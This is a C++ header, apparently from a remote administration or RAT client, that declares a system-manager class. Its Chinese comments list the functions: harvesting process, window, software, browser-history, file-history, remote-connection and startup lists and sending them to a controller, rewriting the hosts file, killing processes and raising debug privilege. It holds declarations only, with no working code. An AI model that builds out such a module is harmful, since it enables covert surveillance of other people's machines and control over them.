#pragma once
#include "../../PublicInclude/Manager.h"

class CSystemManager : public CManager
{
public:

	CSystemManager(CClientSocket* pClient);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static bool DebugPrivilege(const char* PName, BOOL bEnable);
	static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);

private:
	//通过快捷方式获取完整路径
	BOOL FindLnkPath(char* lnk, char* bug, DWORD SIZE);

	//------------------------------------------------------信息获取与发送---------------------------
	LPBYTE getProcessList();							//进程发送和获取				
	void SendProcessList();

	LPBYTE GeHistoryFileList();							//文件访问历史	
	void SendHistoryFileList();

	LPBYTE getWindowsList();							//获取发送和获取							
	void SendWindowsList();						

	void SendHostsFileInfo();							//host文件发送和保存
	void SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize);

	LPBYTE getSoftWareList();							//安装信息获取与发送
	void SendSoftWareList();

	LPBYTE getIEHistoryList();						//历史记录获取与发送
	void SendIEHistoryList();

	LPBYTE GetRemoteList();					//获取远程连接记录
	void SendRemoteList();

	void SendStartupList();					//启动项
	LPBYTE getStartupList();

	void SendNetStateList();			//网络状态

	void KillProcess(LPBYTE lpBuffer, UINT nSize, BOOL Flag);

protected:
	
	void TestWindow(LPBYTE buf);
	void CloseWindow(LPBYTE buf);
};
